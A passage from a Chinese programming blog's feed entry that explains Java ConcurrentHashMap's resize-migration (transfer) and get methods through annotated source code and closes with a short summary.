的属性，用于控制迁移的位置</span></span><br><span class="line">        transferIndex = n;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> <span class="variable">nextn</span> <span class="operator">=</span> nextTab.length;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// ForwardingNode 翻译过来就是正在被迁移的 Node</span></span><br><span class="line">    <span class="comment">// 这个构造方法会生成一个Node，key、value 和 next 都为 null，关键是 hash 为 MOVED</span></span><br><span class="line">    <span class="comment">// 后面我们会看到，原数组中位置 i 处的节点完成迁移工作后，</span></span><br><span class="line">    <span class="comment">//    就会将位置 i 处设置为这个 ForwardingNode，用来告诉其他线程该位置已经处理过了</span></span><br><span class="line">    <span class="comment">//    所以它其实相当于是一个标志。</span></span><br><span class="line">    ForwardingNode&lt;K,V&gt; fwd = <span class="keyword">new</span> <span class="title class_">ForwardingNode</span>&lt;K,V&gt;(nextTab);</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="comment">// advance 指的是做完了一个位置的迁移工作，可以准备做下一个位置的了</span></span><br><span class="line">    <span class="type">boolean</span> <span class="variable">advance</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">finishing</span> <span class="operator">=</span> <span class="literal">false</span>; <span class="comment">// to ensure sweep before committing nextTab</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 下面这个 for 循环，最难理解的在前面，而要看懂它们，应该先看懂后面的，然后再倒回来看</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// i 是位置索引，bound 是边界，注意是从后往前</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>, bound = <span class="number">0</span>;;) &#123;</span><br><span class="line">        Node&lt;K,V&gt; f; <span class="type">int</span> fh;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 下面这个 while 真的是不好理解</span></span><br><span class="line">        <span class="comment">// advance 为 true 表示可以进行下一个位置的迁移了</span></span><br><span class="line">        <span class="comment">//   简单理解结局：i 指向了 transferIndex，bound 指向了 transferIndex-stride</span></span><br><span class="line">        <span class="keyword">while</span> (advance) &#123;</span><br><span class="line">            <span class="type">int</span> nextIndex, nextBound;</span><br><span class="line">            <span class="keyword">if</span> (--i &gt;= bound || finishing)</span><br><span class="line">                advance = <span class="literal">false</span>;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 将 transferIndex 值赋给 nextIndex</span></span><br><span class="line">            <span class="comment">// 这里 transferIndex 一旦小于等于 0，说明原数组的所有位置都有相应的线程去处理了</span></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> ((nextIndex = transferIndex) &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">                i = -<span class="number">1</span>;</span><br><span class="line">                advance = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (U.compareAndSwapInt</span><br><span class="line">                     (<span class="built_in">this</span>, TRANSFERINDEX, nextIndex,</span><br><span class="line">                      nextBound = (nextIndex &gt; stride ?</span><br><span class="line">                                   nextIndex - stride : <span class="number">0</span>))) &#123;</span><br><span class="line">                <span class="comment">// 看括号中的代码，nextBound 是这次迁移任务的边界，注意，是从后往前</span></span><br><span class="line">                bound = nextBound;</span><br><span class="line">                i = nextIndex - <span class="number">1</span>;</span><br><span class="line">                advance = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (i &lt; <span class="number">0</span> || i &gt;= n || i + n &gt;= nextn) &#123;</span><br><span class="line">            <span class="type">int</span> sc;</span><br><span class="line">            <span class="keyword">if</span> (finishing) &#123;</span><br><span class="line">                <span class="comment">// 所有的迁移操作已经完成</span></span><br><span class="line">                nextTable = <span class="literal">null</span>;</span><br><span class="line">                <span class="comment">// 将新的 nextTab 赋值给 table 属性，完成迁移</span></span><br><span class="line">                table = nextTab;</span><br><span class="line">                <span class="comment">// 重新计算 sizeCtl：n 是原数组长度，所以 sizeCtl 得出的值将是新数组长度的 0.75 倍</span></span><br><span class="line">                sizeCtl = (n &lt;&lt; <span class="number">1</span>) - (n &gt;&gt;&gt; <span class="number">1</span>);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 之前我们说过，sizeCtl 在迁移前会设置为 (rs &lt;&lt; RESIZE_STAMP_SHIFT) + 2</span></span><br><span class="line">            <span class="comment">// 然后，每有一个线程参与迁移就会将 sizeCtl 加 1，</span></span><br><span class="line">            <span class="comment">// 这里使用 CAS 操作对 sizeCtl 进行减 1，代表做完了属于自己的任务</span></span><br><span class="line">            <span class="keyword">if</span> (U.compareAndSwapInt(<span class="built_in">this</span>, SIZECTL, sc = sizeCtl, sc - <span class="number">1</span>)) &#123;</span><br><span class="line">                <span class="comment">// 任务结束，方法退出</span></span><br><span class="line">                <span class="keyword">if</span> ((sc - <span class="number">2</span>) != resizeStamp(n) &lt;&lt; RESIZE_STAMP_SHIFT)</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                </span><br><span class="line">                <span class="comment">// 到这里，说明 (sc - 2) == resizeStamp(n) &lt;&lt; RESIZE_STAMP_SHIFT，</span></span><br><span class="line">                <span class="comment">// 也就是说，所有的迁移任务都做完了，也就会进入到上面的 if(finishing)&#123;&#125; 分支了</span></span><br><span class="line">                finishing = advance = <span class="literal">true</span>;</span><br><span class="line">                i = n; <span class="comment">// recheck before commit</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 如果位置 i 处是空的，没有任何节点，那么放入刚刚初始化的 ForwardingNode ”空节点“</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ((f = tabAt(tab, i)) == <span class="literal">null</span>)</span><br><span class="line">            advance = casTabAt(tab, i, <span class="literal">null</span>, fwd);</span><br><span class="line">        <span class="comment">// 该位置处是一个 ForwardingNode，代表该位置已经迁移过了</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ((fh = f.hash) == MOVED)</span><br><span class="line">            advance = <span class="literal">true</span>; <span class="comment">// already processed</span></span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 对数组该位置处的结点加锁，开始处理数组该位置处的迁移工作</span></span><br><span class="line">            <span class="keyword">synchronized</span> (f) &#123;</span><br><span class="line">                <span class="keyword">if</span> (tabAt(tab, i) == f) &#123;</span><br><span class="line">                    Node&lt;K,V&gt; ln, hn;</span><br><span class="line">                    <span class="comment">// 头结点的 hash 大于 0，说明是链表的 Node 节点</span></span><br><span class="line">                    <span class="keyword">if</span> (fh &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                        <span class="comment">// 下面这一块和 Java7 中的 ConcurrentHashMap 迁移是差不多的，</span></span><br><span class="line">                        <span class="comment">// 需要将链表一分为二，</span></span><br><span class="line">                        <span class="comment">//   找到原链表中的 lastRun，然后 lastRun 及其之后的节点是一起进行迁移的</span></span><br><span class="line">                        <span class="comment">//   lastRun 之前的节点需要进行克隆，然后分到两个链表中</span></span><br><span class="line">                        <span class="type">int</span> <span class="variable">runBit</span> <span class="operator">=</span> fh &amp; n;</span><br><span class="line">                        Node&lt;K,V&gt; lastRun = f;</span><br><span class="line">                        <span class="keyword">for</span> (Node&lt;K,V&gt; p = f.next; p != <span class="literal">null</span>; p = p.next) &#123;</span><br><span class="line">                            <span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span> p.hash &amp; n;</span><br><span class="line">                            <span class="keyword">if</span> (b != runBit) &#123;</span><br><span class="line">                                runBit = b;</span><br><span class="line">                                lastRun = p;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">if</span> (runBit == <span class="number">0</span>) &#123;</span><br><span class="line">                            ln = lastRun;</span><br><span class="line">                            hn = <span class="literal">null</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span> &#123;</span><br><span class="line">                            hn = lastRun;</span><br><span class="line">                            ln = <span class="literal">null</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">for</span> (Node&lt;K,V&gt; p = f; p != lastRun; p = p.next) &#123;</span><br><span class="line">                            <span class="type">int</span> <span class="variable">ph</span> <span class="operator">=</span> p.hash; <span class="type">K</span> <span class="variable">pk</span> <span class="operator">=</span> p.key; <span class="type">V</span> <span class="variable">pv</span> <span class="operator">=</span> p.val;</span><br><span class="line">                            <span class="keyword">if</span> ((ph &amp; n) == <span class="number">0</span>)</span><br><span class="line">                                ln = <span class="keyword">new</span> <span class="title class_">Node</span>&lt;K,V&gt;(ph, pk, pv, ln);</span><br><span class="line">                            <span class="keyword">else</span></span><br><span class="line">                                hn = <span class="keyword">new</span> <span class="title class_">Node</span>&lt;K,V&gt;(ph, pk, pv, hn);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="comment">// 其中的一个链表放在新数组的位置 i</span></span><br><span class="line">                        setTabAt(nextTab, i, ln);</span><br><span class="line">                        <span class="comment">// 另一个链表放在新数组的位置 i+n</span></span><br><span class="line">                        setTabAt(nextTab, i + n, hn);</span><br><span class="line">                        <span class="comment">// 将原数组该位置处设置为 fwd，代表该位置已经处理完毕，</span></span><br><span class="line">                        <span class="comment">//    其他线程一旦看到该位置的 hash 值为 MOVED，就不会进行迁移了</span></span><br><span class="line">                        setTabAt(tab, i, fwd);</span><br><span class="line">                        <span class="comment">// advance 设置为 true，代表该位置已经迁移完毕</span></span><br><span class="line">                        advance = <span class="literal">true</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span> <span class="keyword">if</span> (f <span class="keyword">instanceof</span> TreeBin) &#123;</span><br><span class="line">                        <span class="comment">// 红黑树的迁移</span></span><br><span class="line">                        TreeBin&lt;K,V&gt; t = (TreeBin&lt;K,V&gt;)f;</span><br><span class="line">                        TreeNode&lt;K,V&gt; lo = <span class="literal">null</span>, loTail = <span class="literal">null</span>;</span><br><span class="line">                        TreeNode&lt;K,V&gt; hi = <span class="literal">null</span>, hiTail = <span class="literal">null</span>;</span><br><span class="line">                        <span class="type">int</span> <span class="variable">lc</span> <span class="operator">=</span> <span class="number">0</span>, hc = <span class="number">0</span>;</span><br><span class="line">                        <span class="keyword">for</span> (Node&lt;K,V&gt; e = t.first; e != <span class="literal">null</span>; e = e.next) &#123;</span><br><span class="line">                            <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> e.hash;</span><br><span class="line">                            TreeNode&lt;K,V&gt; p = <span class="keyword">new</span> <span class="title class_">TreeNode</span>&lt;K,V&gt;</span><br><span class="line">                                (h, e.key, e.val, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">                            <span class="keyword">if</span> ((h &amp; n) == <span class="number">0</span>) &#123;</span><br><span class="line">                                <span class="keyword">if</span> ((p.prev = loTail) == <span class="literal">null</span>)</span><br><span class="line">                                    lo = p;</span><br><span class="line">                                <span class="keyword">else</span></span><br><span class="line">                                    loTail.next = p;</span><br><span class="line">                                loTail = p;</span><br><span class="line">                                ++lc;</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">else</span> &#123;</span><br><span class="line">                                <span class="keyword">if</span> ((p.prev = hiTail) == <span class="literal">null</span>)</span><br><span class="line">                                    hi = p;</span><br><span class="line">                                <span class="keyword">else</span></span><br><span class="line">                                    hiTail.next = p;</span><br><span class="line">                                hiTail = p;</span><br><span class="line">                                ++hc;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="comment">// 如果一分为二后，节点数少于 8，那么将红黑树转换回链表</span></span><br><span class="line">                        ln = (lc &lt;= UNTREEIFY_THRESHOLD) ? untreeify(lo) :</span><br><span class="line">                            (hc != <span class="number">0</span>) ? <span class="keyword">new</span> <span class="title class_">TreeBin</span>&lt;K,V&gt;(lo) : t;</span><br><span class="line">                        hn = (hc &lt;= UNTREEIFY_THRESHOLD) ? untreeify(hi) :</span><br><span class="line">                            (lc != <span class="number">0</span>) ? <span class="keyword">new</span> <span class="title class_">TreeBin</span>&lt;K,V&gt;(hi) : t;</span><br><span class="line">                        </span><br><span class="line">                        <span class="comment">// 将 ln 放置在新数组的位置 i</span></span><br><span class="line">                        setTabAt(nextTab, i, ln);</span><br><span class="line">                        <span class="comment">// 将 hn 放置在新数组的位置 i+n</span></span><br><span class="line">                        setTabAt(nextTab, i + n, hn);</span><br><span class="line">                        <span class="comment">// 将原数组该位置处设置为 fwd，代表该位置已经处理完毕，</span></span><br><span class="line">                        <span class="comment">//    其他线程一旦看到该位置的 hash 值为 MOVED，就不会进行迁移了</span></span><br><span class="line">                        setTabAt(tab, i, fwd);</span><br><span class="line">                        <span class="comment">// advance 设置为 true，代表该位置已经迁移完毕</span></span><br><span class="line">                        advance = <span class="literal">true</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>说到底，transfer 这个方法并没有实现所有的迁移任务，每次调用这个方法只实现了 transferIndex 往前 stride 个位置的迁移工作，其他的需要由外围来控制。</p><p>这个时候，再回去仔细看 tryPresize 方法可能就会更加清晰一些了。</p><h3><span id="get-过程分析">get 过程分析</span></h3><p>get 方法从来都是最简单的，这里也不例外：</p><ol><li>计算 hash 值</li><li>根据 hash 值找到数组对应位置: (n - 1) &amp; h</li><li>根据该位置处结点性质进行相应查找<ul><li>如果该位置为 null，那么直接返回 null 就可以了</li><li>如果该位置处的节点刚好就是我们需要的，返回该节点的值即可</li><li>如果该位置节点的 hash 值小于 0，说明正在扩容，或者是红黑树，后面我们再介绍 find 方法</li><li>如果以上 3 条都不满足，那就是链表，进行遍历比对即可</li></ul></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> V <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; e, p; <span class="type">int</span> n, eh; K ek;</span><br><span class="line">    <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> spread(key.hashCode());</span><br><span class="line">    <span class="keyword">if</span> ((tab = table) != <span class="literal">null</span> &amp;&amp; (n = tab.length) &gt; <span class="number">0</span> &amp;&amp;</span><br><span class="line">        (e = tabAt(tab, (n - <span class="number">1</span>) &amp; h)) != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 判断头结点是否就是我们需要的节点</span></span><br><span class="line">        <span class="keyword">if</span> ((eh = e.hash) == h) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((ek = e.key) == key || (ek != <span class="literal">null</span> &amp;&amp; key.equals(ek)))</span><br><span class="line">                <span class="keyword">return</span> e.val;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 如果头结点的 hash 小于 0，说明 正在扩容，或者该位置是红黑树</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (eh &lt; <span class="number">0</span>)</span><br><span class="line">            <span class="comment">// 参考 ForwardingNode.find(int h, Object k) 和 TreeBin.find(int h, Object k)</span></span><br><span class="line">            <span class="keyword">return</span> (p = e.find(h, key)) != <span class="literal">null</span> ? p.val : <span class="literal">null</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 遍历链表</span></span><br><span class="line">        <span class="keyword">while</span> ((e = e.next) != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (e.hash == h &amp;&amp;</span><br><span class="line">                ((ek = e.key) == key || (ek != <span class="literal">null</span> &amp;&amp; key.equals(ek))))</span><br><span class="line">                <span class="keyword">return</span> e.val;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单说一句，此方法的大部分内容都很简单，只有正好碰到扩容的情况，ForwardingNode.find(int h, Object k) 稍微复杂一些，不过在了解了数据迁移的过程后，这个也就不难了，所以限于篇幅这里也不展开说了。</p><h2><span id="总结">总结</span></h2><p>其实也不是很难嘛，虽然没有像之前的 AQS 和线程池一样一行一行源码进行分析，但还是把所有初学者可能会糊涂的地方都进行了深入的介绍，只要是稍微有点基础的读者，应该是很容易就能看懂 HashMap 和 ConcurrentHashMap 源码了。</p><p>看源码不算是目的吧，深入地了解 Doug Lea 的设计思路，我觉得还挺有趣的，大师就是大师，代码写得真的是好啊。</p><p>我发现很多人都以为我写博客主要是源码分析，说真的，我对于源码分析没有那么大热情，主要都是为了用源码说事罢了，可能之后的文章还是会有比较多的源码分析成分。</p><p>不要脸地自以为本文的质量还是挺高的，信息量比较大，如果你觉得有写得不好的地方，或者说看完本文你还是没看懂它们，那么请提出来~~~</p><p>（全文完）</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="源码" scheme="https://disda-coding.github.io/categories/%E6%BA%90%E7%A0%81/"/>
    
    
    <category term="HashMap" scheme="https://disda-coding.github.io/tags/HashMap/"/>
    
  </entry>
  
</feed>
